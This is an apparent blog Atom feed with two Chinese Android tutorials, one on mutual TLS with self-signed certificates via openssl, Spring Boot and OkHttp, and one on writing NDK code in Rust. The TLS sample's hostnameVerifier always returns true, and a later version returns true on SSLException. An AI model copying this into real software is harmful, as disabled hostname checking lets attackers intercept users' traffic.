<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>欢迎来到安全后厨！</title>
  
  
  <link href="http://security-kitchen.com/atom.xml" rel="self"/>
  
  <link href="http://security-kitchen.com/"/>
  <updated>2023-12-24T14:13:13.637Z</updated>
  <id>http://security-kitchen.com/</id>
  
  <author>
    <name>安全后厨团队</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android自定义证书实现双向认证1（littleQ）</title>
    <link href="http://security-kitchen.com/2023/12/24/littleQ1/"/>
    <id>http://security-kitchen.com/2023/12/24/littleQ1/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-24T14:13:13.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android自定义证书实现双向认证（littleQ）"><a href="#Android自定义证书实现双向认证（littleQ）" class="headerlink" title="Android自定义证书实现双向认证（littleQ）"></a>Android自定义证书实现双向认证（littleQ）</h1><p>作者：littleQ</p><p>相信各位读者至少应该是见过使用双向认证的Android程序了，那么如果作为开发者，我们如何来实现双向认证呢，本文来一起看一下如何利用自签名证书实现双向认证。</p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>要实现双向认证，我们首先肯定是要生成证书了，这里工具我选择的是openssl，在mac&#x2F;ubuntu上这个命令是可以直接执行的，在win上，自行安装下吧，环境安装不在本文的讨论范围之内。</p><h3 id="利用openssl生成CA证书"><a href="#利用openssl生成CA证书" class="headerlink" title="利用openssl生成CA证书"></a>利用openssl生成CA证书</h3><h4 id="生成CA根证书"><a href="#生成CA根证书" class="headerlink" title="生成CA根证书"></a>生成CA根证书</h4><ul><li>生成密钥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out rootCA.key 2048</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_uAz6w8n6Lh.png"></p><ul><li>生成请求文件(csr)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key rootCA.key -out rootCA.csr -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_8na2w7mJ9L.png"></p><p>这里里面内容可以随便输，没什么影响。</p><ul><li>生成crt证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -<span class="keyword">in</span> rootCA.csr -signkey rootCA.key -out rootCA.crt -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_wos7giaHeG.png"></p><h3 id="自签名证书生成（服务端）"><a href="#自签名证书生成（服务端）" class="headerlink" title="自签名证书生成（服务端）"></a>自签名证书生成（服务端）</h3><ul><li>生成密钥</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out serverCA.key 2048</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_OxVFSZScZt.png"></p><ul><li>生成请求文件(csr)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new  -key serverCA.key -out serverCA.csr -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_JD-nsnLSwA.png"></p><p>这里需要注意下，这里必须和访问的域名一致，这里我用的ip地址，所以这里填我的ip地址，这里读者要根据自己的情况来处理。</p><ul><li>生成crt证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -<span class="keyword">in</span> serverCA.csr -out serverCA.crt -sha256</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_Ia9oFzkR5r.png"></p><p>这里一共可以生成7个文件，如果生成少了，大概率是前面做错了，需要重新做。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_nCeIYIWmZ7.png"></p><h2 id="后端搭建"><a href="#后端搭建" class="headerlink" title="后端搭建"></a>后端搭建</h2><p>因为这是双向认证，所以我们需要搭建一个后端，这里我们采用springboot来搭建后端。</p><h3 id="将服务端密钥-key文件转换为-p12文件"><a href="#将服务端密钥-key文件转换为-p12文件" class="headerlink" title="将服务端密钥.key文件转换为.p12文件"></a>将服务端密钥.key文件转换为.p12文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="built_in">export</span> -clcerts -<span class="keyword">in</span> serverCA.crt -inkey serverCA.key -out serverCA.p12</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_mJrnQk3XzS.png"></p><p>这里需要输入一个密码，需要记住，后面要用。</p><p>来看下我们生成的证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore serverCA.p12</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_rEKoZFVQ0J.png"></p><p>注意，有这个打印才能是成功的，要注意，这里的指纹是SHA-256的，如果是SHA1，请注意这个Android10不认，需要重新搞，这里需要输入刚才设置的密码，密码先别忘记，等会还要用。</p><h3 id="新建一个springboot项目"><a href="#新建一个springboot项目" class="headerlink" title="新建一个springboot项目"></a>新建一个springboot项目</h3><p>这个就不展开讲了，直接新建即可，然后在<code>application.yml</code>里面配置如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">18443</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/api</span></span><br><span class="line">  <span class="attr">ssl:</span></span><br><span class="line">    <span class="attr">key-store:</span> <span class="string">classpath:serverCA.p12</span></span><br><span class="line">    <span class="attr">key-store-password:</span> <span class="string">这是刚才所输入的密码</span></span><br><span class="line">    <span class="attr">keyStoreType:</span> <span class="string">PKCS12</span></span><br><span class="line">    <span class="attr">keyAlias:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后写个helloword运行一下，我们直接来访问下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_lTdR1VpcQy.png"></p><p>这就说明了，这里我们需要用https的形式来访问，切换到https之后，访问是正常的，因为这里是自签名证书，所以Chrome不认，报了危险。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_zOy3CHG1cE.png"></p><p>然后，我们来看证书的信息</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_dvxtinkLry.png"></p><p>这里和我们刚才的输入是一致的。</p><h3 id="Android使用OKhttp访问"><a href="#Android使用OKhttp访问" class="headerlink" title="Android使用OKhttp访问"></a>Android使用OKhttp访问</h3><p>新建一个Android项目，然后引入OKhttp的包，这里新建Android项目也不过多介绍了，注意别忘了添加联网权限。这里只粘贴关键代码，其他代码自行补充完整。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">// 这里需要粘贴自己证书的内容</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ROOT_CA_CERT</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        OkHttpClient.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder()</span><br><span class="line">                .retryOnConnectionFailure(<span class="literal">false</span>)</span><br><span class="line">                .connectTimeout(<span class="number">60</span>, TimeUnit.SECONDS)</span><br><span class="line">                .readTimeout(<span class="number">60</span>, TimeUnit.SECONDS)</span><br><span class="line">                .writeTimeout(<span class="number">60</span>, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// region TrustManager</span></span><br><span class="line">        <span class="type">TrustManagerFactory</span> <span class="variable">trustManagerFactory</span> <span class="operator">=</span></span><br><span class="line">                <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            trustManagerFactory.init(getKeyStore());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException | KeyStoreException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();</span><br><span class="line">        <span class="keyword">if</span> (trustManagers.length != <span class="number">1</span> || !(trustManagers[<span class="number">0</span>] <span class="keyword">instanceof</span> X509TrustManager)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected default trust managers:&quot;</span></span><br><span class="line">                    + Arrays.toString(trustManagers));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">X509TrustManager</span> <span class="variable">trustManager</span> <span class="operator">=</span> (X509TrustManager) trustManagers[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// endregion</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// region SSLContext</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sslContext.init(<span class="literal">null</span>, trustManagers, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            builder.sslSocketFactory(sslContext.getSocketFactory(), trustManager);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyManagementException | NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// endregion</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对hostname进行校验, 这里直接返回true, 这里可以取到之前设置的IP</span></span><br><span class="line">        builder.hostnameVerifier((String hostname, SSLSession session) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... 发送请求并验证</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> KeyStore <span class="title function_">getKeyStore</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 添加https证书</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CertificateFactory</span> <span class="variable">certificateFactory</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line">            <span class="type">KeyStore</span> <span class="variable">keyStore</span> <span class="operator">=</span> KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">            keyStore.load(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Buffer</span>().writeUtf8(ROOT_CA_CERT).inputStream();</span><br><span class="line">            <span class="comment">// 签名文件设置证书</span></span><br><span class="line">            keyStore.setCertificateEntry(<span class="string">&quot;0&quot;</span>, certificateFactory.generateCertificate(is));</span><br><span class="line">            is.close();</span><br><span class="line">            <span class="keyword">return</span> keyStore;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个内容，说明是成功了的，否则就是失败了。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_RYhvy0zAZN.png"></p><p>到目前为止，我们已经完成了单向认证，也就是客户端校验服务端的证书，也就是标准的https的过程，接下来我们一起在此基础之上看一下双向认证是如何来实现的。</p><h2 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h2><ul><li>根据上述生成服务端证书的方法生成客户端的证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out clientCA.key 2048</span><br><span class="line">openssl req -new  -key clientCA.key -out clientCA.csr -sha256</span><br><span class="line">openssl x509 -req -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -<span class="keyword">in</span> clientCA.csr -out clientCA.crt -sha256</span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -clcerts -<span class="keyword">in</span> clientCA.crt -inkey clientCA.key -out clientCA.p12</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_QxV35eFf_D.png"></p><p>这里，同样需要输入密码，也是要记住的。</p><ul><li>将上面的证书转换为Android可用的格式</li></ul><p><a href="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16" title="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16">https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16</a>下载这个工具转换即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore clientCA.p12 -srcstoretype pkcs12 -destkeystore clientCA.bks -deststoretype bks -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath bcprov-jdk16-1.46.jar</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_IXehv1H0uW.png"></p><p>这个密码和上面一致就可以了。</p><ul><li>修改Android代码，添加新的证书</li></ul><p>这里，只贴出了差异的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// region 双向认证服务端证书</span></span><br><span class="line">        <span class="type">KeyStore</span> <span class="variable">clientKeyStore</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientKeyStore = KeyStore.getInstance(<span class="string">&quot;BKS&quot;</span>);</span><br><span class="line">            clientKeyStore.load(getApplicationContext().getAssets().open(<span class="string">&quot;clientCA.bks&quot;</span>), <span class="string">&quot;刚才需要记住的密码&quot;</span>.toCharArray());</span><br><span class="line">            <span class="type">KeyManagerFactory</span> <span class="variable">keyManagerFactory</span> <span class="operator">=</span></span><br><span class="line">                    KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            keyManagerFactory.init(clientKeyStore, <span class="string">&quot;刚才需要记住的密码&quot;</span>.toCharArray());</span><br><span class="line">            sslContext = SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sslContext.init(keyManagerFactory.getKeyManagers(), trustManagers, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            builder.sslSocketFactory(sslContext.getSocketFactory(), trustManager);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyStoreException | IOException | NoSuchAlgorithmException | UnrecoverableKeyException | CertificateException | KeyManagementException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// endregion</span></span><br><span class="line"></span><br><span class="line">        builder.hostnameVerifier((String hostname, SSLSession session) -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> Certificate[] certs = session.getPeerCertificates();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">X509Certificate</span> <span class="variable">x509</span> <span class="operator">=</span> (X509Certificate) certs[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">return</span> verifyHostName(hostname, x509);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SSLException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>转换服务端根证书到keystore格式</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -import -file rootCA.crt -<span class="built_in">alias</span> rootCA -keystore rootCA.keystore -storepass 密码</span><br></pre></td></tr></table></figure><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_esGXxpchqu.png"></p><ul><li>配置服务端证书</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="attr">client-auth:</span> <span class="string">need</span></span><br><span class="line">    <span class="attr">trust-store:</span> <span class="string">classpath:rootCA.keystore</span></span><br><span class="line">    <span class="attr">trust-store-password:</span> <span class="string">刚才的密码</span></span><br><span class="line">    <span class="attr">trust-store-type:</span> <span class="string">JKS</span></span><br><span class="line">    <span class="attr">trust-store-provider:</span> <span class="string">SUN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后，我们直接用Chrome打开看一下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_LelbMjw5CP.png"></p><p>这里，提示我们客户端证书校验失败，这就是后端配置成功了，然后我们运行下app来看一下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_ZcOGc8nqaO.png"></p><p>发现，客户端是可以获取成功的，到这里我们双向认证就完成了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可能经常遇到使用了双向认证的APP，但是咱们能不能自己实现一下这个双向认证呢，本文主要是给大家提供了一个自签名证书实现双向认证的方案，仅供参考。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p><a href="https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/" title="https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/">https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/</a></p></li><li><p><a href="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16" title="https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16">https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Android自定义证书实现双向认证（littleQ）&quot;&gt;&lt;a href=&quot;#Android自定义证书实现双向认证（littleQ）&quot; class=&quot;headerlink&quot; title=&quot;Android自定义证书实现双向认证（littleQ）&quot;&gt;&lt;/a&gt;Android自定义证书实现双向认证（littleQ）&lt;/h1&gt;&lt;p&gt;作者：littleQ&lt;/p&gt;
&lt;p&gt;相信各位读者至少应该是见过使用双向认证的Android程序了，那么如果作为开发者，我们如何来实现双向认证呢，本文来一起看一下如何利用自签名证书实现双向认证。&lt;/p&gt;</summary>
    
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="抓包" scheme="http://security-kitchen.com/tags/%E6%8A%93%E5%8C%85/"/>
    
    <category term="Android开发" scheme="http://security-kitchen.com/tags/Android%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android开发(2)-- 使用Rust编写NDK代码（littleQ）</title>
    <link href="http://security-kitchen.com/2023/12/24/littleQ2/"/>
    <id>http://security-kitchen.com/2023/12/24/littleQ2/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-24T14:34:34.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Rust编写NDK代码"><a href="#使用Rust编写NDK代码" class="headerlink" title="使用Rust编写NDK代码"></a>使用Rust编写NDK代码</h1><p>这次我们来使用rust来编写ndk的代码。<br>作者：littleQ</p><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>Android开发环境(含NDK)</p></li><li><p>Rust开发环境</p></li></ul><h2 id="集成过程"><a href="#集成过程" class="headerlink" title="集成过程"></a>集成过程</h2><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><p>这里，我们和AndroidStudio给我们提供的样板代码一样，先简单的写一个demo，因此依赖比较简单。</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;android-ndk-demo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">jni</span> = <span class="string">&quot;0.20.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[lib]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;ndkdemo&quot;</span></span><br><span class="line"><span class="attr">crate-type</span> = [<span class="string">&quot;cdylib&quot;</span>]</span><br></pre></td></tr></table></figure><p>到这里，目前只需要jni这一个依赖就够了，然后底下的name是最后编译出来的so的名字，注意这里名字不能含有下划线，否则编译不过。</p><h3 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h3><p>这里，先采用哪个模板项目，返回一个字符串，先来看一下效果。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib.rs</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#![cfg(target_os = <span class="string">&quot;android&quot;</span>)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> jni::JNIEnv;</span><br><span class="line"><span class="keyword">use</span> jni::objects::&#123;JObject&#125;;</span><br><span class="line"><span class="keyword">use</span> jni::sys::jstring;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[no_mangle]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">extern</span> <span class="keyword">fn</span> <span class="title function_">Java_com_littleq_androidndkdemo_MainActivity_stringFromJNI</span>(</span><br><span class="line">    env: JNIEnv, _: JObject) <span class="punctuation">-&gt;</span> jstring &#123;</span><br><span class="line">    env.<span class="title function_ invoke__">new_string</span>(<span class="string">&quot;Hello from Rust&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t create java string!&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">into_raw</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo ndk --platform 21 --target arm64-v8a build --release</span><br></pre></td></tr></table></figure><p>这里，我们直接编译arm64的release版本就好了。</p><h3 id="集成so到Android项目"><a href="#集成so到Android项目" class="headerlink" title="集成so到Android项目"></a>集成so到Android项目</h3><p>这里，如何新建Android项目，在这里就不过多说了，相信做过Android开发的应该没有不会的吧，没做过Android开发的，可能也不会点开这一篇文章。</p><ul><li>1）在src的同级目录添加libs文件夹，按照如下形式放入刚才编译完成的so</li></ul><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog2/image_goMIwNABpT.png"></p><ul><li>2）在gradle里配置libs的查找路径</li></ul><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog2/image_WIWY9N9UpH.png"></p><ul><li>3）在需要调用的地方，加载ndk，并调用</li></ul><figure class="highlight java"><table><tr><td 